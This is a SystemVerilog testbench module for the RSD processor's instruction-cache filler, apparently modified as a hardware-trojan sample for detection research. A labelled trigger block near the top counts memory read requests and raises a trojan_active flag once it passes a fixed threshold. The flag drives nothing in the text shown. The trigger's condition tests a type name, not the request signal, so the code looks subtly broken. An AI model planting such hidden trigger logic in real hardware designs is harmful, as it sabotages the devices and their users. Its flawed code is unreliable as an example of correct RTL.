// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestICacheFillerTop_trojan_DoS #(
    parameter INIT_HEX_FILE = "../../Src/Verification/TestCode/C/Dhrystone/code-100k.hex"
)(
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic icMiss,
        AddrPath icMissAddr,
        WayPtr icVictimWayPtr,
        MemAccessResult icMemAccessResult,
    output
        logic icFill,
        logic icFillerBusy,
        AddrPath icFillAddr,
        WayPtr icFillWayPtr,
        LineDataPath icFillData,
        MemReadAccessReq icMemAccessReq
    );

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 17056;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (MemReadAccessReq) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    
    // Clock and Reset
    logic clk, memCLK, rst, mmcmLocked;
    `ifdef RSD_SYNTHESIS
        MultiClock clkgen(
            .CLK_IN1_P(clk_p),
            .CLK_IN1_N(clk_n),
            .CLK_OUT1(clk),
            .CLK_OUT2(memCLK),
            .RESET(rstTrigger),
            .LOCKED(mmcmLocked)
        );
    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = rst;
    
    // interfaces
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    ICacheFiller iCacheFiller( cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        cacheSystemIF.icMiss = icMiss;
        cacheSystemIF.icMissAddr = icMissAddr;
        cacheSystemIF.icVictimWayPtr = icVictimWayPtr;
        cacheSystemIF.icMemAccessResult = icMemAccessResult;
        
        // Output of this module.
        icFill = cacheSystemIF.icFill;
        icFillerBusy = cacheSystemIF.icFillerBusy;
        icFillAddr = cacheSystemIF.icFillAddr;
        icFillWayPtr = cacheSystemIF.icFillWayPtr;
        icFillData = cacheSystemIF.icFillData;
        icMemAccessReq = cacheSystemIF.icMemAccessReq;
    end
endmodule
